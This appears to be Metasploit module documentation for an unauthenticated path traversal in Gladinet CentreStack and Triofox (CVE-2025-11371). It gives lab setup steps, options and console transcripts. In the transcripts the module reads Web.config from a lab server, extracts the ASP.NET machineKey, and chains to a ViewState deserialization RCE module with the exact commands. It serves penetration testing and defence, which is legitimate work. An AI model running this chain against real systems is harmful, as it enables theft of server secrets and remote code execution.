## Vulnerable Application

A path traversal vulnerability (CVE-2025-11371) exists in Gladinet CentreStack and Triofox that allows an
unauthenticated attacker to read arbitrary files from the server's file system.

**Note:** The official CVE advisory incorrectly refers to this as a "Local File Inclusion" (LFI) vulnerability.
This is technically a path traversal vulnerability since the files are only read/disclosed, not included or executed.
LFI implies code execution through file inclusion (like PHP's `include()`), which is not the case here.

The vulnerability exists in the `/storage/t.dn` endpoint which does not properly sanitize the `s` parameter,
allowing path traversal attacks. This can be used to read sensitive files such as `Web.config` which
contains the `machineKey` used for ViewState deserialization attacks (CVE-2025-30406).

* Gladinet CentreStack versions up to 16.10.10408.56683 are vulnerable.
* Gladinet Triofox versions up to 16.10.10408.56683 are vulnerable.

The following releases were tested.

**Gladinet CentreStack:**
* Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019

## Installation steps to install Gladinet CentreStack or Triofox Enterprise Editions

* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download an evaluation Windows Server iso image (2016, 2019 or 2022) and install it as a VM on your virtualization engine.
* Note: Google is your best friend on how to do this ;-)
* Download the [Gladinet CentreStack gui installer](https://www.centrestack.com/p/gce_latest_release.html) or...
* Download the [Gladinet Triofox gui installer](https://access.triofox.com/releases_history/).
* Note: For Triofox, you will need a free trail account to reach the installer page.
* Run the gui installer on your Windows VM.
* Reboot your VM and you should be able to access the application via `https://your_ip/portal/loginpage.aspx`.

You are now ready to test the module.

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use auxiliary/gather/gladinet_storage_path_traversal_cve_2025_11371`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>` (default: 80)
- [ ] `run`
- [ ] The module should read the Web.config file and extract the machineKey

## Actions

### EXTRACT_MACHINEKEY (default)

Read the Web.config file and extract the machineKey for use with the RCE exploit module.

### READ_FILE

Read an arbitrary file from the target without attempting to extract the machineKey.

## Options

### FILEPATH

The file path to read on the target. Default: `Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`

### DEPTH

Path traversal depth (number of `..\` sequences). Default: `..\..\..\`

This option allows you to adjust the path traversal depth based on the target's directory structure.
You may need to increase or decrease the depth depending on where the application is installed.

## Scenarios

### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Extracting machineKey (default action)

```msf
msf6 > use auxiliary/gather/gladinet_storage_path_traversal_cve_2025_11371
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set rport 80
rport => 80
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set ssl false
ssl => false
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > run
[*] Running module against 192.168.1.21
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Path traversal vulnerability confirmed (Build 16.1.10296.56315)
[*] Attempting to read file via path traversal: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
[+] Successfully read file: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config

<?xml version="1.0" encoding="UTF-8"?>
<!--
    Note: As an alternative to hand editing this file you can use the 
    web admin tool to configure settings for your application. Use
    the Website->Asp.Net Configuration option in Visual Studio.
    A full list of settings and comments can be found in 
    machine.config.comments usually located in 
    \Windows\Microsoft.Net\Framework\v2.x\Config 
-->
<configuration>
   <system.web>
		<compilation debug="false" />
        <machineKey decryption="AES" decryptionKey="B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9" validationKey="5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16" />
		<customErrors mode="RemoteOnly" defaultRedirect="defaulterrorpage.htm">
			<error statusCode="404" redirect="defaulterrorpage.htm" />
			<error statusCode="403" redirect="defaulterrorpage.htm" />
			<error statusCode="401" redirect="defaulterrorpage.htm" />
			<error statusCode="500" redirect="defaulterrorpage.htm" />
		</customErrors>
		<trust level="Full" />
		<identity impersonate="false" />
   </system.web>

  <system.serviceModel>
    <bindings>
      <wsHttpBinding>
        <binding name="WSHttpBinding_IHostsMgr" closeTimeout="00:01:00" openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00" bypassProxyOnLocal="false" transactionFlow="false" hostNameComparisonMode="StrongWildcard" maxBufferPoolSize="524288" maxReceivedMessageSize="65536" messageEncoding="Text" textEncoding="utf-8" useDefaultWebProxy="true" allowCookies="false">
          <readerQuotas maxDepth="32" maxStringContentLength="8192" maxArrayLength="16384" maxBytesPerRead="4096" maxNameTableCharCount="16384" />
          <reliableSession ordered="true" inactivityTimeout="00:10:00" enabled="false" />
          <security mode="Message">
            <transport clientCredentialType="Windows" proxyCredentialType="None" realm="" />
            <message clientCredentialType="Windows" negotiateServiceCredential="true" algorithmSuite="Default" establishSecurityContext="true" />
          </security>
        </binding>
      </wsHttpBinding>
    </bindings>
    <client>
      <endpoint address="http://localhost:8732/GladinetCloudMonitor/HostsMgr.svc/" binding="wsHttpBinding" bindingConfiguration="WSHttpBinding_IHostsMgr" contract="IHostsMgr" name="WSHttpBinding_IHostsMgr">
        <identity>
          <dns value="localhost" />
        </identity>
      </endpoint>
    </client>
  </system.serviceModel>
  
  <appSettings file="branding.config">
	
	<add key="Sysnumber" value="4855426994914051" />
	<add key="EmailPwd" value="" />
    <add key="InstalledApp" value="true" />
	<add key="UseDerivedSysNumber" value="true" />
	<add key="CSBizEdition" value="true" />
	<add key="CanTrace" value="false" />

  </appSettings>

  <system.webServer>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="4294967295"></requestLimits>
      </requestFiltering>
    </security>
        <httpRedirect enabled="true" exactDestination="true" httpResponseStatus="Found">
            <add wildcard="*/" destination="/portal/loginpage.aspx" />
            <add wildcard="/files" destination="/portal/files$Q" />
            <add wildcard="/portal" destination="/portal/files" />
            <add wildcard="/portal/" destination="/portal/files" />
            <add wildcard="/clustermgrconsole" destination="/management/clustermgrconsole" />
            <add wildcard="/tenantconsole" destination="/management/tenantconsole" />
            <add wildcard="/tenantbackupconsole" destination="/management/tenantbackupconsole" />
            <add wildcard="/clusterbackupconsole" destination="/management/clusterbackupconsole" />
        </httpRedirect>
  </system.webServer>
  
</configuration>

[+] File saved to: /home/user/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.file_441872.txt
[+] Extracted machineKey from Web.config
MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16

[+] For RCE: use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
[*] Set the MACHINEKEY option in the exploit module:
use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
[+] MachineKey saved to: /home/user/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.machine_180409.txt
[*] Auxiliary module execution completed
```

### Reading an arbitrary file (READ_FILE action)

```msf
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set action READ_FILE
action => READ_FILE
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set filepath "Windows\System32\drivers\etc\hosts"
filepath => Windows\System32\drivers\etc\hosts
msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > run
[*] Running module against 192.168.1.21
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Path traversal vulnerability confirmed
[*] Attempting to read file via path traversal: Windows\System32\drivers\etc\hosts
[+] Successfully read file: Windows\System32\drivers\etc\hosts

    # Copyright (c) 1993-2009 Microsoft Corp.
    #
    # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
    #
    # This file contains the mappings of IP addresses to host names. Each
    # entry should be kept on an individual line. The IP address should
    # be placed in the first column followed by the corresponding host name.
    # The IP address and the host name should be separated by at least one
    # space.
    #
    # Additionally, comments (such as these) may be inserted on individual
    # lines or following the machine name denoted by a '#' symbol.
    #
    # For example:
    #
    #      102.54.94.97     rhino.acme.com          # source server
    #       38.25.63.10     x.acme.com              # x client host

    # localhost name resolution is handled within DNS itself.
    #	127.0.0.1       localhost
    #	::1             localhost


[+] File saved to: /home/user/.msf4/loot/20251212164258_default_192.168.1.21_gladinet.file_348807.txt
[*] Auxiliary module execution completed
```

## Limitations

The path traversal vulnerability requires directory traversal using Windows-style backslashes (`\`). The module automatically
prepends the `DEPTH` option value (default: `..\..\..\`) to the file path to escape from the web root directory.
You can adjust the `DEPTH` option if the default value doesn't work for your target.

Some files may not be readable due to:
* File system permissions
* IIS request filtering
* File locking by the application
